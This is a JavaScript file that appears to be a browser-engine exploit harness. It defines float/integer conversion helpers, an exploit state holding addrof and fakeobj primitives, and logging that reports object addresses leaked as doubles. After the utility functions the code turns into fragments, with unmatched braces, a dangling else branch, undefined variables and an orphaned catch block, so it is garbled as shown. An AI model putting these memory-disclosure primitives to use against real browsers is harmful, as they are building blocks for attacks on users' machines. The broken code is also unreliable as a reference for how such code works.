// ============================================
// GLOBALS AND UTILITIES
// ============================================

var g_arr = new ArrayBuffer(8);
var g_f64 = new Float64Array(g_arr);
var g_u32 = new Uint32Array(g_arr);

function f2i(f) {
    g_f64[0] = f;
    return BigInt(g_u32[0]) + (BigInt(g_u32[1]) << 32n);
}

function i2f(i) {
    var bigIntVal = BigInt(i);
    g_u32[0] = Number(bigIntVal & 0xffffffffn);
    g_u32[1] = Number(bigIntVal >> 32n);
    return g_f64[0];
}

function hex(val) {
    if (typeof val === 'bigint') {
        var str = val.toString(16);
        while (str.length < 16) str = '0' + str;
        return '0x' + str;
    }
    if (typeof val === 'number') {
        return '0x' + val.toString(16);
    }
    return String(val);
}

var exploitState = {
    addrof_ff: null,
    fakeobj_ff: null,
    victim: null,
    leakedAddresses: {},
    corrupted: false
};

function log(msg, type) {
    var div = document.createElement('div');
    div.className = 'log ' + (type || '');
    div.textContent = '[' + new Date().toISOString().substr(14, 9) + '] ' + msg;
    var logDiv = document.getElementById('log');
    logDiv.appendChild(div);
    logDiv.scrollTop = logDiv.scrollHeight;
}

function sep() {
    log('═'.repeat(90), 'info');
}

        } else {

        log('Created doubles array with known bit patterns', 'success');
        
        for (var i = 0; i < doubles.length; i++) {

        if (typeof lastVal === 'number') {
            var leakedBits = f2i(lastVal);
            log('⚠️ LEAKED OBJECT AS DOUBLE: ' + hex(leakedBits), 'critical');
            exploitState.leakedAddresses['target'] = leakedBits;

        log('', '');
        sep();
        log('REFINED ADDROF RESULTS:', 'warn');

        var leakCount = Object.keys(exploitState.leakedAddresses).length;
        log('Addresses leaked: ' + leakCount, leakCount > 0 ? 'critical' : 'fail');
        
        for (var key in exploitState.leakedAddresses) {
            log('  ' + key + ': ' + hex(exploitState.leakedAddresses[key]), 'critical');
        }
        
        sep();
        
    } catch(e) {
        log('', '');
        log('✗ REFINED ADDROF ERROR: ' + e.message, 'fail');
        if (e.stack) {
            log('Stack: ' + e.stack.substring(0, 300), 'fail');
        }
    }
}
